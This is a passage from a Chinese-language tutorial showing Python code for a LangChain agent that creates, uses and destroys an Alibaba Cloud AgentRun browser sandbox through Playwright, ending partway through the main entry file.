# 阿里云账号的访问密钥 <span class="hljs-variable constant_">ID</span> 和访问密钥 <span class="hljs-title class_">Secret</span>，用于 <span class="hljs-title class_">AgentRun</span> <span class="hljs-variable constant_">SDK</span> 鉴权
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCESS_KEY_ID</span>=your-ak
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCESS_KEY_SECRET</span>=your-sk
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCOUNT_ID</span>=your-main-account-id
<span class="hljs-variable constant_">ALIBABA_CLOUD_REGION</span>=cn-hangzhou

# browser sandbox 模板的名称，可以在 <span class="hljs-attr">https</span>:<span class="hljs-comment">//functionai.console.aliyun.com/cn-hangzhou/agent/runtime/sandbox 控制台创建</span>
<span class="hljs-variable constant_">BROWSER_TEMPLATE_NAME</span>=sandbox-your-template-name

# agentrun 的控制面和数据面的 <span class="hljs-variable constant_">API</span> 端点请求地址，默认cn-hangzhou
<span class="hljs-variable constant_">AGENTRUN_CONTROL_ENDPOINT</span>=agentrun.<span class="hljs-property">cn</span>-hangzhou.<span class="hljs-property">aliyuncs</span>.<span class="hljs-property">com</span>
<span class="hljs-variable constant_">AGENTRUN_DATA_ENDPOINT</span>=<span class="hljs-attr">https</span>:<span class="hljs-comment">//${your-main-account-id}.agentrun-data.cn-hangzhou.aliyuncs.com</span>
</code></pre>
<h5 data-id="heading-15">步骤 3: 创建 Sandbox 生命周期管理模块</h5>
<p>创建 sandbox_manager.py 文件，负责 Sandbox 的创建、管理和销毁。核心代码如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
Sandbox 生命周期管理模块

负责 AgentRun Browser Sandbox 的创建、管理和销毁。
提供统一的接口供 LangChain Agent 使用。
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-title class_">Optional</span>, <span class="hljs-title class_">Dict</span>, <span class="hljs-title class_">Any</span>
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv

# 加载环境变量
<span class="hljs-title function_">load_dotenv</span>()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"Sandbox 生命周期管理器"</span><span class="hljs-string">""</span>
    
    def <span class="hljs-title function_">__init__</span>(self):
        self.<span class="hljs-property">_sandbox</span>: <span class="hljs-title class_">Optional</span>[<span class="hljs-title class_">Any</span>] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_sandbox_id</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_cdp_url</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_vnc_url</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
    
    def <span class="hljs-title function_">create</span>(
        self,
        <span class="hljs-attr">template_name</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>,
        <span class="hljs-attr">idle_timeout</span>: int = <span class="hljs-number">3000</span>
    ) -&gt; <span class="hljs-title class_">Dict</span>[str, <span class="hljs-title class_">Any</span>]:
        <span class="hljs-string">""</span><span class="hljs-string">"
        创建或获取一个浏览器 sandbox 实例
        
        Args:
            template_name: Sandbox 模板名称，如果为 None 则从环境变量读取
            idle_timeout: 空闲超时时间（秒），默认 3000 秒
        
        Returns:
            dict: 包含 sandbox_id, cdp_url, vnc_url 的字典
        
        Raises:
            RuntimeError: 创建失败时抛出异常
        "</span><span class="hljs-string">""</span>
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> agentrun.<span class="hljs-property">sandbox</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">Sandbox</span>, <span class="hljs-title class_">TemplateType</span>
            
            # 如果已有 sandbox，直接返回
            <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is not <span class="hljs-title class_">None</span>:
                <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">get_info</span>()
            
            # 从环境变量获取模板名称
            <span class="hljs-keyword">if</span> template_name is <span class="hljs-title class_">None</span>:
                template_name = os.<span class="hljs-title function_">getenv</span>(
                    <span class="hljs-string">"BROWSER_TEMPLATE_NAME"</span>,
                    <span class="hljs-string">"sandbox-browser-demo"</span>
                )
            
            # 创建 sandbox
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">Sandbox</span>.<span class="hljs-title function_">create</span>(
                template_type=<span class="hljs-title class_">TemplateType</span>.<span class="hljs-property">BROWSER</span>,
                template_name=template_name,
                sandbox_idle_timeout_seconds=idle_timeout
            )
            
            self.<span class="hljs-property">_sandbox_id</span> = self.<span class="hljs-property">_sandbox</span>.<span class="hljs-property">sandbox_id</span>
            self.<span class="hljs-property">_cdp_url</span> = self.<span class="hljs-title function_">_get_cdp_url</span>()
            self.<span class="hljs-property">_vnc_url</span> = self.<span class="hljs-title function_">_get_vnc_url</span>()
            
            <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">get_info</span>()
        
        except <span class="hljs-title class_">ImportError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-title function_">print</span>(e)
            raise <span class="hljs-title class_">RuntimeError</span>(
                <span class="hljs-string">"agentrun-sdk 未安装，请运行: pip install agentrun-sdk[playwright,server]"</span>
            )
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            raise <span class="hljs-title class_">RuntimeError</span>(f<span class="hljs-string">"创建 Sandbox 失败: {str(e)}"</span>)
    
    def <span class="hljs-title function_">get_info</span>(self) -&gt; <span class="hljs-title class_">Dict</span>[str, <span class="hljs-title class_">Any</span>]:
        <span class="hljs-string">""</span><span class="hljs-string">"
        获取当前 sandbox 的信息
        
        Returns:
            dict: 包含 sandbox_id, cdp_url, vnc_url 的字典
        
        Raises:
            RuntimeError: 如果没有活动的 sandbox
        "</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is <span class="hljs-title class_">None</span>:
            raise <span class="hljs-title class_">RuntimeError</span>(<span class="hljs-string">"没有活动的 sandbox，请先创建"</span>)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"sandbox_id"</span>: self.<span class="hljs-property">_sandbox_id</span>,
            <span class="hljs-string">"cdp_url"</span>: self.<span class="hljs-property">_cdp_url</span>,
            <span class="hljs-string">"vnc_url"</span>: self.<span class="hljs-property">_vnc_url</span>,
        }
    
    def <span class="hljs-title function_">get_cdp_url</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"获取 CDP URL"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">get_cdp_url</span>()
    
    def <span class="hljs-title function_">get_vnc_url</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"获取 VNC URL"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">get_vnc_url</span>()
    
    def <span class="hljs-title function_">get_sandbox_id</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"获取 Sandbox ID"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox_id</span>
    
    def <span class="hljs-title function_">destroy</span>(self) -&gt; <span class="hljs-attr">str</span>:
        <span class="hljs-string">""</span><span class="hljs-string">"
        销毁当前的 sandbox 实例
        
        Returns:
            str: 操作结果描述
        "</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is <span class="hljs-title class_">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"没有活动的 sandbox"</span>
        
        <span class="hljs-attr">try</span>:
            sandbox_id = self.<span class="hljs-property">_sandbox_id</span>
            
            # 尝试销毁 sandbox
            <span class="hljs-keyword">if</span> <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'delete'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">delete</span>()
            elif <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'stop'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">stop</span>()
            elif <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'destroy'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">destroy</span>()
            
            # 清理状态
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_sandbox_id</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_cdp_url</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_vnc_url</span> = <span class="hljs-title class_">None</span>
            
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"Sandbox 已销毁: {sandbox_id}"</span>
        
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            # 即使销毁失败，也清理本地状态
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_sandbox_id</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_cdp_url</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_vnc_url</span> = <span class="hljs-title class_">None</span>
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"销毁 Sandbox 时出错: {str(e)}"</span>
    
    def <span class="hljs-title function_">is_active</span>(self) -&gt; <span class="hljs-attr">bool</span>:
        <span class="hljs-string">""</span><span class="hljs-string">"检查 sandbox 是否活跃"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span> is not <span class="hljs-title class_">None</span>
    
    def <span class="hljs-title function_">__enter__</span>(self):
        <span class="hljs-string">""</span><span class="hljs-string">"上下文管理器入口"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self
    
    def <span class="hljs-title function_">__exit__</span>(self, exc_type, exc_val, exc_tb):
        <span class="hljs-string">""</span><span class="hljs-string">"上下文管理器退出，自动销毁"</span><span class="hljs-string">""</span>
        self.<span class="hljs-title function_">destroy</span>()
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">False</span>


# 全局单例（可选，用于简单场景）
<span class="hljs-attr">_global_manager</span>: <span class="hljs-title class_">Optional</span>[<span class="hljs-title class_">SandboxManager</span>] = <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">get_global_manager</span>() -&gt; <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"获取全局 SandboxManager 单例"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _global_manager
    <span class="hljs-keyword">if</span> _global_manager is <span class="hljs-title class_">None</span>:
        _global_manager = <span class="hljs-title class_">SandboxManager</span>()
    <span class="hljs-keyword">return</span> _global_manager


def <span class="hljs-title function_">reset_global_manager</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"重置全局 SandboxManager"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _global_manager
    <span class="hljs-keyword">if</span> <span class="hljs-attr">_global_manager</span>:
        _global_manager.<span class="hljs-title function_">destroy</span>()
    _global_manager = <span class="hljs-title class_">None</span>
</code></pre>
<p><strong>关键功能：</strong></p>
<ol>
<li><strong>创建 Sandbox</strong>: 使用 AgentRun SDK 创建浏览器 Sandbox</li>
<li><strong>获取连接信息</strong>: 自动获取 CDP URL 和 VNC URL，支持多种属性名兼容</li>
<li><strong>生命周期管理</strong>: 提供销毁方法，确保资源正确释放</li>
</ol>
<h5 data-id="heading-16">步骤 4: 创建 LangChain Tools 和 Agent</h5>
<p>创建 <code>langchain_agent.py</code> 文件，定义 LangChain tools 并创建 Agent。核心代码如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
LangChain Agent 和 Tools 注册模块

负责创建 LangChain Agent，注册 Sandbox 相关的 tools，并集成 VNC 可视化。

本模块使用 sandbox_manager.py 中封装的 SandboxManager 来管理 sandbox 生命周期。
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> langchain.<span class="hljs-property">tools</span> <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> <span class="hljs-title class_">ChatOpenAI</span>
<span class="hljs-keyword">from</span> langchain.<span class="hljs-property">agents</span> <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> <span class="hljs-title class_">BaseModel</span>, <span class="hljs-title class_">Field</span>

# 导入 sandbox 管理器
<span class="hljs-keyword">from</span> sandbox_manager <span class="hljs-keyword">import</span> <span class="hljs-title class_">SandboxManager</span>

# 加载环境变量
<span class="hljs-title function_">load_dotenv</span>()

# 全局 sandbox 管理器实例（单例模式）
<span class="hljs-attr">_sandbox_manager</span>: <span class="hljs-title class_">SandboxManager</span> | <span class="hljs-title class_">None</span> = <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">get_sandbox_manager</span>() -&gt; <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"获取 sandbox 管理器实例（单例模式）"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _sandbox_manager
    <span class="hljs-keyword">if</span> _sandbox_manager is <span class="hljs-title class_">None</span>:
        _sandbox_manager = <span class="hljs-title class_">SandboxManager</span>()
    <span class="hljs-keyword">return</span> _sandbox_manager


# ============ <span class="hljs-title class_">LangChain</span> <span class="hljs-title class_">Tools</span> 定义 ============

<span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">create_browser_sandbox</span>(
    <span class="hljs-attr">template_name</span>: str = <span class="hljs-title class_">None</span>,
    <span class="hljs-attr">idle_timeout</span>: int = <span class="hljs-number">3000</span>
) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"创建或获取一个浏览器 sandbox 实例。
    
    当需要访问网页、执行浏览器操作时，首先需要创建 sandbox。
    创建成功后，会返回 sandbox 信息，包括 VNC URL 用于可视化。
    
    Args:
        template_name: Sandbox 模板名称，如果不提供则从环境变量 BROWSER_TEMPLATE_NAME 读取
        idle_timeout: 空闲超时时间（秒），默认 3000 秒
    
    Returns:
        Sandbox 信息字符串，包括 ID、CDP URL、VNC URL
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        # 如果 template_name 为空字符串，转换为 <span class="hljs-title class_">None</span> 以便从环境变量读取
        <span class="hljs-keyword">if</span> template_name == <span class="hljs-string">""</span>:
            template_name = <span class="hljs-title class_">None</span>
        info = manager.<span class="hljs-title function_">create</span>(template_name=template_name, idle_timeout=idle_timeout)
        
        result = f<span class="hljs-string">""</span><span class="hljs-string">"✅ Sandbox 创建成功！

📋 Sandbox 信息:
- ID: {info['sandbox_id']}
- CDP URL: {info['cdp_url']}
"</span><span class="hljs-string">""</span>
        
        vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
            result += f<span class="hljs-string">"- VNC URL: {vnc_url}\n\n"</span>
            result += <span class="hljs-string">"提示: VNC 查看器应该已自动打开，您可以在浏览器中实时查看浏览器操作。"</span>
        <span class="hljs-attr">else</span>:
            result += <span class="hljs-string">"\n警告: 未获取到 VNC URL，可能无法使用可视化功能。"</span>
        
        <span class="hljs-keyword">return</span> result
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" 创建 Sandbox 失败: {str(e)}"</span>


<span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">get_sandbox_info</span>() -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"获取当前 sandbox 的详细信息，包括 ID、CDP URL、VNC URL 等。
    
    当需要查看当前 sandbox 状态或获取 VNC 连接信息时使用此工具。
    
    Returns:
        Sandbox 信息字符串
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        info = manager.<span class="hljs-title function_">get_info</span>()
        
        result = f<span class="hljs-string">""</span><span class="hljs-string">"📋 当前 Sandbox 信息:

- Sandbox ID: {info['sandbox_id']}
- CDP URL: {info['cdp_url']}
"</span><span class="hljs-string">""</span>
        
        <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
            result += f<span class="hljs-string">"- VNC URL: {info['vnc_url']}\n\n"</span>
            result += <span class="hljs-string">"您可以使用 VNC URL 在浏览器中实时查看操作过程。\n"</span>
            result += <span class="hljs-string">"   推荐使用 vnc.html 文件或 noVNC 客户端。"</span>
        
        <span class="hljs-keyword">return</span> result
    
    except <span class="hljs-title class_">RuntimeError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" {str(e)}"</span>
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" 获取 Sandbox 信息失败: {str(e)}"</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">NavigateInput</span>(<span class="hljs-title class_">BaseModel</span>):
    <span class="hljs-string">""</span><span class="hljs-string">"浏览器导航输入参数"</span><span class="hljs-string">""</span>
    <span class="hljs-attr">url</span>: str = <span class="hljs-title class_">Field</span>(description=<span class="hljs-string">"要访问的网页 URL，必须以 http:// 或 https:// 开头"</span>)
    <span class="hljs-attr">wait_until</span>: str = <span class="hljs-title class_">Field</span>(
        <span class="hljs-keyword">default</span>=<span class="hljs-string">"load"</span>,
        description=<span class="hljs-string">"等待页面加载的状态: load, domcontentloaded, networkidle"</span>
    )
    <span class="hljs-attr">timeout</span>: int = <span class="hljs-title class_">Field</span>(
        <span class="hljs-keyword">default</span>=<span class="hljs-number">30000</span>,
        description=<span class="hljs-string">"超时时间（毫秒），默认 30000"</span>
    )


<span class="hljs-meta">@tool</span>(args_schema=<span class="hljs-title class_">NavigateInput</span>)
def <span class="hljs-title function_">navigate_to_url</span>(<span class="hljs-attr">url</span>: str, <span class="hljs-attr">wait_until</span>: str = <span class="hljs-string">"load"</span>, <span class="hljs-attr">timeout</span>: int = <span class="hljs-number">30000</span>) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"使用 sandbox 中的浏览器导航到指定 URL。
    
    当用户需要访问网页时使用此工具。导航后可以在 VNC 中实时查看页面。
    
    Args:
        url: 要访问的网页 URL
        wait_until: 等待页面加载的状态（load/domcontentloaded/networkidle）
        timeout: 超时时间（毫秒）
    
    Returns:
        导航结果描述
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        
        <span class="hljs-keyword">if</span> not manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-keyword">return</span> <span class="hljs-string">" 错误: 请先创建 sandbox"</span>
        
        # 验证 <span class="hljs-variable constant_">URL</span>
        <span class="hljs-keyword">if</span> not url.<span class="hljs-title function_">startswith</span>((<span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span>)):
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" 错误: 无效的 URL 格式: {url}"</span>
        
        cdp_url = manager.<span class="hljs-title function_">get_cdp_url</span>()
        <span class="hljs-keyword">if</span> not <span class="hljs-attr">cdp_url</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" 错误: 无法获取 CDP URL"</span>
        
        # 使用 <span class="hljs-title class_">Playwright</span> 连接浏览器并导航
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
            
            <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
                browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
                pages = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span> <span class="hljs-keyword">if</span> browser.<span class="hljs-property">contexts</span> <span class="hljs-keyword">else</span> []
                
                <span class="hljs-keyword">if</span> <span class="hljs-attr">pages</span>:
                    page = pages[<span class="hljs-number">0</span>]
                <span class="hljs-attr">else</span>:
                    page = browser.<span class="hljs-title function_">new_page</span>()
                
                page.<span class="hljs-title function_">goto</span>(url, wait_until=wait_until, timeout=timeout)
                title = page.<span class="hljs-title function_">title</span>()
                
                <span class="hljs-keyword">return</span> f<span class="hljs-string">"已成功导航到: {url}\n📄 页面标题: {title}\n💡 您可以在 VNC 中查看页面内容。"</span>
        
        except <span class="hljs-title class_">ImportError</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"导航指令已发送: {url}\n💡 提示: 安装 playwright 以启用实际导航功能 (pip install playwright)"</span>
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" 导航失败: {str(e)}"</span>
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" 操作失败: {str(e)}"</span>


<span class="hljs-meta">@tool</span>(<span class="hljs-string">"browser_screenshot"</span>, description=<span class="hljs-string">"在浏览器 sandbox 中截取当前页面截图"</span>)
def <span class="hljs-title function_">take_screenshot</span>(<span class="hljs-attr">filename</span>: str = <span class="hljs-string">"screenshot.png"</span>) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"截取浏览器当前页面的截图。
    
    Args:
        filename: 截图文件名，默认 "</span>screenshot.<span class="hljs-property">png</span><span class="hljs-string">"
    
    Returns:
        操作结果
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        
        <span class="hljs-keyword">if</span> not manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-keyword">return</span> <span class="hljs-string">" 错误: 请先创建 sandbox"</span>
        
        cdp_url = manager.<span class="hljs-title function_">get_cdp_url</span>()
        <span class="hljs-keyword">if</span> not <span class="hljs-attr">cdp_url</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" 错误: 无法获取 CDP URL"</span>
        
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
            
            <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
                browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
                pages = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span> <span class="hljs-keyword">if</span> browser.<span class="hljs-property">contexts</span> <span class="hljs-keyword">else</span> []
                
                <span class="hljs-keyword">if</span> <span class="hljs-attr">pages</span>:
                    page = pages[<span class="hljs-number">0</span>]
                <span class="hljs-attr">else</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-string">" 错误: 没有打开的页面"</span>
                
                page.<span class="hljs-title function_">screenshot</span>(path=filename)
                <span class="hljs-keyword">return</span> f<span class="hljs-string">"截图已保存: {filename}"</span>
        
        except <span class="hljs-title class_">ImportError</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" 错误: 需要安装 playwright (pip install playwright)"</span>
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" 截图失败: {str(e)}"</span>
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" 操作失败: {str(e)}"</span>


<span class="hljs-meta">@tool</span>(<span class="hljs-string">"destroy_sandbox"</span>, description=<span class="hljs-string">"销毁当前的 sandbox 实例，释放资源。注意：仅在程序退出或明确需要释放资源时使用，不要在一轮对话后销毁。"</span>)
def <span class="hljs-title function_">destroy_sandbox</span>() -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"销毁当前的 sandbox 实例。
    
    重要提示：此工具应该仅在以下情况使用：
    - 程序即将退出
    - 明确需要释放资源
    - 用户明确要求销毁
    
    不要在一轮对话完成后就销毁 sandbox，因为 sandbox 可以在多轮对话中复用。
    
    Returns:
        操作结果
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        result = manager.<span class="hljs-title function_">destroy</span>()
        <span class="hljs-keyword">return</span> result
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" 销毁失败: {str(e)}"</span>


# ============ <span class="hljs-title class_">Agent</span> 创建 ============

def <span class="hljs-title function_">create_browser_agent</span>(<span class="hljs-attr">system_prompt</span>: str = <span class="hljs-title class_">None</span>):
    <span class="hljs-string">""</span><span class="hljs-string">"
    创建带有 sandbox 工具的 LangChain Agent
    
    Args:
        system_prompt: 自定义系统提示词，如果为 None 则使用默认提示词
    
    Returns:
        LangChain Agent 实例
    "</span><span class="hljs-string">""</span>
    # 配置 <span class="hljs-title class_">DashScope</span> <span class="hljs-variable constant_">API</span>
    api_key = os.<span class="hljs-title function_">getenv</span>(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>)
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">api_key</span>:
        raise <span class="hljs-title class_">ValueError</span>(<span class="hljs-string">"请设置环境变量 DASHSCOPE_API_KEY"</span>)
    
    base_url = <span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>
    model_name = os.<span class="hljs-title function_">getenv</span>(<span class="hljs-string">"QWEN_MODEL"</span>, <span class="hljs-string">"qwen-plus"</span>)
    
    # 创建 <span class="hljs-variable constant_">LLM</span>
    model = <span class="hljs-title class_">ChatOpenAI</span>(
        model=model_name,
        api_key=api_key,
        base_url=base_url,
        temperature=<span class="hljs-number">0.7</span>,
    )
    
    # 创建工具列表
    tools = [
        create_browser_sandbox,
        get_sandbox_info,
        navigate_to_url,
        take_screenshot,
        destroy_sandbox,
    ]
    
    # 默认系统提示词
    <span class="hljs-keyword">if</span> system_prompt is <span class="hljs-title class_">None</span>:
        system_prompt = <span class="hljs-string">""</span><span class="hljs-string">"你是一个浏览器自动化助手，可以使用 sandbox 来访问和操作网页。

当用户需要访问网页时，请按以下步骤操作：
1. 首先创建或获取 sandbox（如果还没有）
2. 使用 navigate_to_url 导航到目标网页
3. 执行用户请求的操作
4. 如果需要，可以截取截图

重要提示：
- 创建 sandbox 后，会返回 VNC URL，用户可以使用它实时查看浏览器操作
- 所有操作都会在 VNC 中实时显示，方便调试和监控
- sandbox 可以在多轮对话中复用，不要在一轮对话完成后就销毁
- 只有在用户明确要求销毁时才使用 destroy_sandbox 工具
- 不要主动建议用户销毁 sandbox，除非用户明确要求
- 请始终用中文回复，确保操作准确、高效。"</span><span class="hljs-string">""</span>
    
    # 创建 <span class="hljs-title class_">Agent</span>
    agent = <span class="hljs-title function_">create_agent</span>(
        model=model,
        tools=tools,
        system_prompt=system_prompt,
    )
    
    <span class="hljs-keyword">return</span> agent


def <span class="hljs-title function_">get_available_tools</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"获取所有可用的工具列表"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">return</span> [
        create_browser_sandbox,
        get_sandbox_info,
        navigate_to_url,
        take_screenshot,
        destroy_sandbox,
    ]
</code></pre>
<p><strong>关键要点：</strong></p>
<ol>
<li><strong>Tool 定义</strong>: 使用 <code>@tool</code> 装饰器定义 LangChain tools</li>
<li><strong>类型提示</strong>: 所有参数必须有类型提示，用于生成工具 schema</li>
<li><strong>文档字符串</strong>: 详细的文档字符串帮助 LLM 理解何时使用工具</li>
<li><strong>单例模式</strong>: 使用全局管理器实例确保 Sandbox 在会话中复用</li>
</ol>
<h5 data-id="heading-17">步骤 5: 创建主入口文件</h5>
<p>创建 <code>main.py</code> 文件，作为程序入口。核心代码如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
LangChain + AgentRun Browser Sandbox 集成示例

主入口文件，演示如何使用 LangChain Agent 与 AgentRun Browser Sandbox 集成。
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> webbrowser
